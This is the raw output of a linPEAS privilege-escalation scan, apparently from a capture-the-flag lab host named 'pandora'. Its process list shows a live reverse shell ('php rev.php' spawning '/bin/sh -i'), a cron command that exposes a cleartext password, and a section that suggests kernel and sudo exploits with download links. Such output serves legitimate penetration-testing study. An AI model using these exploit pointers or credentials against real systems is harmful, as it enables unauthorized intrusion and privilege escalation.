

```
$ ./linpeas_linux_amd64


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                      
    |---------------------------------------------------------------------------------|                                                                      
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                      
    |         Follow on Twitter         :     @hacktricks_live                        |                                                                      
    |         Respect on HTB            :     SirBroccoli                             |                                                                      
    |---------------------------------------------------------------------------------|                                                                      
    |                                 Thank you!                                      |                                                                      
    \---------------------------------------------------------------------------------/                                                                      
          linpeas-ng by carlospolop                                                                                                                          
                                                                                                                                                             
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                
                                                                                                                                                             
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                     
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                          
                               ╚═══════════════════╝                                                                                                         
OS: Linux version 5.4.0-91-generic (buildd@lcy01-amd64-017) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021
User & Groups: uid=1000(matt) gid=1000(matt) groups=1000(matt)
Hostname: pandora
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                                                                                                   
[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                           
                                                                                                                                                             
[+] nmap is available for network discovery & port scanning, you should use it yourself                                                                      
                                                                                                                                                             

Caching directories DONE
                                                                                                                                                             
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                           
                              ╚════════════════════╝                                                                                                         
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                           
Linux version 5.4.0-91-generic (buildd@lcy01-amd64-017) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021       
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.3 LTS
Release:        20.04
Codename:       focal

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                              
Sudo version 1.8.31                                                                                                                                          


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                      
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                 

╔══════════╣ Date & uptime
Sat Dec 16 02:25:59 UTC 2023                                                                                                                                 
 02:25:59 up 1 day, 12:14,  1 user,  load average: 0.15, 0.06, 0.68

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                         
sda
sda1
sda2
sda3

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                    
/dev/disk/by-id/dm-uuid-LVM-99uC6MxZWzeIMM3qv6kdF4jGfpSPmJlczhUMINcnSjc3rvckbEI6cLdwGIX82FbV / ext4 defaults 0 0                                             
/dev/disk/by-uuid/936758c6-52fb-4c55-9db2-f8555009c6e2 /boot ext4 defaults 0 0
/dev/mapper/ubuntu--vg-swap     none    swap    sw      0       0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                      
HISTFILESIZE=0                                                                                                                                               
OLDPWD=/
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:21664
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
INVOCATION_ID=8e2ec7c443e64b9f906682359c2b62d3
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/home/matt
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                                       
dmesg Not Found                                                                                                                                              
                                                                                                                                                             
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                           
[+] [CVE-2022-2586] nft_object UAF                                                                                                                           

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                      
                                                                                                                                                             
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                                                     
═╣ PaX bins present? .............. PaX Not Found                                                                                                            
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                     
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                       
═╣ Seccomp enabled? ............... enabled                                                                                                                  
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                                                                                                             

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                          
                                   ╚═══════════╝                                                                                                             
╔══════════╣ Container related tools present (if any):
╔══════════╣ Am I Containered?                                                                                                                               
╔══════════╣ Container details                                                                                                                               
═╣ Is this a container? ........... No                                                                                                                       
═╣ Any running containers? ........ No                                                                                                                       
                                                                                                                                                             

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                          
                                     ╚═══════╝                                                                                                               
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM? ............................ No
═╣ Azure APP? ........................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                           
                ╚════════════════════════════════════════════════╝                                                                                           
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                  
root           1  0.0  0.2 171040 11280 ?        Ss   Dec14   0:13 /sbin/init maybe-ubiquity                                                                 
root         489  0.0  0.4  76076 19756 ?        S<s  Dec14   0:01 /lib/systemd/systemd-journald
root         515  0.0  0.1  21524  5592 ?        Ss   Dec14   0:01 /lib/systemd/systemd-udevd
systemd+     534  0.0  0.1  18408  7436 ?        Ss   Dec14   0:03 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
root         661  0.0  0.4 214600 17940 ?        SLsl Dec14   0:14 /sbin/multipathd -d -s
systemd+     684  0.0  0.3  24028 12964 ?        Ss   Dec14   0:14 /lib/systemd/systemd-resolved
systemd+     685  0.0  0.1  90228  6080 ?        Ssl  Dec14   0:09 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root         699  0.0  0.2  47540 10372 ?        Ss   Dec14   0:00 /usr/bin/VGAuthService
root         710  0.0  0.2 311496  8296 ?        Ssl  Dec14   2:05 /usr/bin/vmtoolsd
root         759  0.0  0.2 239280  9452 ?        Ssl  Dec14   0:02 /usr/lib/accountsservice/accounts-daemon[0m
root         777  0.0  0.0   6812  2976 ?        Ss   Dec14   0:00 /usr/sbin/cron -f
root         790  0.0  0.0   8352  3488 ?        S    Dec14   0:00  _ /usr/sbin/CRON -f
root         800  0.0  0.0   2608   608 ?        Ss   Dec14   0:00      _ /bin/sh -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
root        1114  0.0  0.0   2488  1352 ?        S    Dec14   0:00          _ /usr/bin/host_check -u daniel -p HotelBabylon23
message+     785  0.0  0.1   7708  4860 ?        Ss   Dec14   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root         805  0.0  0.0  81960  3556 ?        Ssl  Dec14   0:04 /usr/sbin/irqbalance --foreground
root         814  0.0  0.4  29080 18028 ?        Ss   Dec14   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
syslog       820  0.0  0.1 224348  5028 ?        Ssl  Dec14   0:00 /usr/sbin/rsyslogd -n -iNONE
root         827  0.0  0.1  16892  7768 ?        Ss   Dec14   0:00 /lib/systemd/systemd-logind
root         829  0.0  0.3 394912 13724 ?        Ssl  Dec14   0:00 /usr/lib/udisks2/udisksd
daemon[0m       830  0.0  0.0   3792  2232 ?        Ss   Dec14   0:00 /usr/sbin/atd -f
Debian-+     834  0.0  0.3  22756 13328 ?        Ss   Dec14   0:48 /usr/sbin/snmpd -LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid
root         835  0.0  0.7 228068 31696 ?        Ss   Dec14   0:08 /usr/sbin/apache2 -k start
www-data   53657  0.0  0.3 228548 14648 ?        S    01:51   0:01  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
matt       65578  0.0  0.3 228572 14004 ?        S    02:20   0:00  |   _ /usr/sbin/apache2 -k start
www-data   53722  0.0  0.3 228548 14648 ?        S    01:51   0:01  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
matt       65296  0.0  0.3 228572 13996 ?        S    02:12   0:00  |   _ /usr/sbin/apache2 -k start
matt       65297  0.0  0.0   2608   612 ?        S    02:12   0:00  |       _ sh -c python3 -c "import pty; pty.spawn('/bin/bash')"
matt       65298  0.0  0.2  15960  9508 ?        S    02:12   0:00  |           _ python3 -c import pty; pty.spawn('/bin/bash')
matt       65299  0.0  0.1   8368  4816 pts/1    Ss+  02:12   0:00  |               _ /bin/bash
www-data   55398  0.0  0.3 228548 14648 ?        S    01:52   0:01  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data   58831  0.0  0.3 228548 14648 ?        S    01:54   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data   59227  0.0  0.3 228548 14648 ?        S    01:54   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data   59913  0.0  0.3 228548 14648 ?        S    01:54   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data   59959  0.0  0.3 228548 14648 ?        S    01:54   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data   59961  0.0  0.3 228548 14648 ?        S    01:54   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data   60983  0.0  0.3 228548 14648 ?        S    01:55   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data   61029  0.0  0.3 228548 14648 ?        S    01:55   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
daniel     43630  0.4  0.1  14812  6948 ?        S    00:47   0:25      _ sshd: daniel@pts/0
daniel     43631  0.0  0.1   8272  5340 pts/0    Ss+  00:47   0:00          _ -bash
root         939  0.0  0.2 236420  9004 ?        Ssl  Dec14   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         957  0.0  0.0   5828  1796 tty1     Ss+  Dec14   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
mysql        961  0.1  2.7 1722624 111072 ?      Ssl  Dec14   2:37 /usr/sbin/mysqld
root        6173  0.0  0.2 241188  9472 ?        Ssl  Dec14   0:00 /usr/lib/upower/upowerd
daniel     43548  0.0  0.2  18408  9512 ?        Ss   00:47   0:00 /lib/systemd/systemd --user
daniel     43549  0.0  0.0 170604  3420 ?        S    00:47   0:00  _ (sd-pam)
matt       65581  0.0  0.2  91612  8872 ?        Ss   02:20   0:00 php rev.php
matt       65582  0.0  0.0   2608   608 ?        S    02:20   0:00  _ sh -c uname -a; w; id; /bin/sh -i
matt       65586  0.0  0.0   2608  1680 ?        S    02:20   0:00      _ /bin/sh -i
matt       65605  0.0  0.0 704376  2076 ?        Sl   02:25   0:00          _ ./linpeas_linux_amd64
matt       65609  0.0  0.0   2516   592 ?        S    02:25   0:00              _ base64 -d
matt       65610  0.2  0.0   3484  2888 ?        S    02:25   0:00              _ /bin/sh
matt       68807  0.0  0.0   3484  1088 ?        S    02:26   0:00                  _ /bin/sh
matt       68810  0.0  0.0   6220  3192 ?        R    02:26   0:00                  |   _ ps fauxwww
matt       68811  0.0  0.0   3484  1088 ?        S    02:26   0:00                  _ /bin/sh

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                 
                                                                                                                                                             
╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                                                                    
Proc 534 with ppid 1 is run by user systemd-network but the ppid user is root                                                                                
Proc 684 with ppid 1 is run by user systemd-resolve but the ppid user is root
Proc 685 with ppid 1 is run by user systemd-timesync but the ppid user is root
Proc 785 with ppid 1 is run by user messagebus but the ppid user is root
Proc 820 with ppid 1 is run by user syslog but the ppid user is root
Proc 830 with ppid 1 is run by user daemon but the ppid user is root
Proc 834 with ppid 1 is run by user Debian-snmp but the ppid user is root
Proc 961 with ppid 1 is run by user mysql but the ppid user is root
Proc 43548 with ppid 1 is run by user daniel but the ppid user is root
Proc 43630 with ppid 43535 is run by user daniel but the ppid user is root
Proc 53657 with ppid 835 is run by user www-data but the ppid user is root
Proc 53722 with ppid 835 is run by user www-data but the ppid user is root
Proc 55398 with ppid 835 is run by user www-data but the ppid user is root
Proc 58831 with ppid 835 is run by user www-data but the ppid user is root
Proc 59227 with ppid 835 is run by user www-data but the ppid user is root
Proc 59913 with ppid 835 is run by user www-data but the ppid user is root
Proc 59959 with ppid 835 is run by user www-data but the ppid user is root
Proc 59961 with ppid 835 is run by user www-data but the ppid user is root
Proc 60983 with ppid 835 is run by user www-data but the ppid user is root
Proc 61029 with ppid 835 is run by user www-data but the ppid user is root
Proc 65296 with ppid 53722 is run by user matt but the ppid user is www-data
Proc 65578 with ppid 53657 is run by user matt but the ppid user is www-data
Proc 65581 with ppid 1 is run by user matt but the ppid user is root

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                           
COMMAND     PID   TID TASKCMD               USER   FD      TYPE  DEVICE SIZE/OFF    NODE NAME                                                                

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                           
gdm-password Not Found                                                                                                                                       
gnome-keyring-daemon Not Found                                                                                                                               
lightdm Not Found                                                                                                                                            
vsftpd Not Found                                                                                                                                             
apache2 process found (dump creds from memory as root)                                                                                                       
sshd: process found (dump creds from memory as root)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                       
/usr/bin/crontab                                                                                                                                             
incrontab Not Found
-rw-r--r-- 1 root root    1042 Jun 16  2021 /etc/crontab                                                                                                     

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 Jun 11  2021 .
drwxr-xr-x 105 root root 4096 Jan  3  2022 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--   1 root root  712 Mar 27  2020 php
-rw-r--r--   1 root root  191 Feb  1  2021 popularity-contest

/etc/cron.daily:
total 52
drwxr-xr-x   2 root root 4096 Jan  3  2022 .
drwxr-xr-x 105 root root 4096 Jan  3  2022 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root  539 Apr 13  2020 apache2
-rwxr-xr-x   1 root root  376 Dec  4  2019 apport
-rwxr-xr-x   1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x   1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x   1 root root 1123 Feb 25  2020 man-db
-rwxr-xr-x   1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x   1 root root  214 Dec  7  2020 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Jun 11  2021 .
drwxr-xr-x 105 root root 4096 Jan  3  2022 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Feb  1  2021 .
drwxr-xr-x 105 root root 4096 Jan  3  2022 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Jan  3  2022 .
drwxr-xr-x 105 root root 4096 Jan  3  2022 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root  813 Feb 25  2020 man-db
-rwxr-xr-x   1 root root  403 Aug  5  2021 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                                               
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                            

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                  
/etc/systemd/system/multi-user.target.wants/atd.service could be executing some relative path                                                                
/etc/systemd/system/multi-user.target.wants/grub-common.service could be executing some relative path
/etc/systemd/system/multi-user.target.wants/mariadb.service could be executing some relative path
/etc/systemd/system/mysql.service could be executing some relative path
/etc/systemd/system/mysqld.service could be executing some relative path
/etc/systemd/system/sleep.target.wants/grub-common.service could be executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                    
NEXT                        LEFT           LAST                        PASSED        UNIT                         ACTIVATES                                  
Sat 2023-12-16 02:39:00 UTC 12min left     Sat 2023-12-16 02:09:00 UTC 17min ago     phpsessionclean.timer        phpsessionclean.service       
Sat 2023-12-16 04:19:27 UTC 1h 52min left  Fri 2023-12-15 09:40:04 UTC 16h ago       fwupd-refresh.timer          fwupd-refresh.service         
Sat 2023-12-16 05:21:28 UTC 2h 54min left  Fri 2023-12-15 23:13:46 UTC 3h 12min ago  ua-timer.timer               ua-timer.service              
Sat 2023-12-16 06:52:19 UTC 4h 25min left  Fri 2023-12-15 06:43:05 UTC 19h ago       apt-daily-upgrade.timer      apt-daily-upgrade.service     
Sat 2023-12-16 14:26:29 UTC 11h left       Fri 2023-12-15 14:26:29 UTC 12h ago       systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sat 2023-12-16 16:04:55 UTC 13h left       Sat 2023-12-16 00:58:02 UTC 1h 28min ago  motd-news.timer              motd-news.service             
Sat 2023-12-16 16:28:42 UTC 14h left       Sat 2023-12-16 00:38:06 UTC 1h 48min ago  apt-daily.timer              apt-daily.service             
Sun 2023-12-17 00:00:00 UTC 21h left       Sat 2023-12-16 00:00:09 UTC 2h 26min ago  logrotate.timer              logrotate.service             
Sun 2023-12-17 00:00:00 UTC 21h left       Sat 2023-12-16 00:00:09 UTC 2h 26min ago  man-db.timer                 man-db.service                
Sun 2023-12-17 03:10:19 UTC 24h left       Thu 2023-12-14 14:12:12 UTC 1 day 12h ago e2scrub_all.timer            e2scrub_all.service           
Mon 2023-12-18 00:00:00 UTC 1 day 21h left Thu 2023-12-14 14:11:31 UTC 1 day 12h ago fstrim.timer                 fstrim.service                
n/a                         n/a            n/a                         n/a           ua-license-check.timer       ua-license-check.service      

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                    
                                                                                                                                                             
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                   
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request                                                  
/usr/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                   
/org/kernel/linux/storage/multipathd                                                                                                                         
/run/dbus/system_bus_socket
  └─(Read Write)
/run/irqbalance//irqbalance805.sock
  └─(Read )
/run/irqbalance/irqbalance805.sock
  └─(Read )
/run/lvm/lvmpolld.socket
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/io.systemd.journal
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/systemd/userdb/io.systemd.DynamicUser
  └─(Read Write)
/run/udev/control
/run/user/1001/bus
/run/user/1001/gnupg/S.dirmngr
/run/user/1001/gnupg/S.gpg-agent
/run/user/1001/gnupg/S.gpg-agent.browser
/run/user/1001/gnupg/S.gpg-agent.extra
/run/user/1001/gnupg/S.gpg-agent.ssh
/run/user/1001/pk-debconf-socket
/run/user/1001/systemd/private
/run/uuidd/request
  └─(Read Write)
/run/vmware/guestServicePipe
  └─(Read Write)
/var/agentx/master
/var/run/vmware/guestServicePipe
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                     
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)                                       

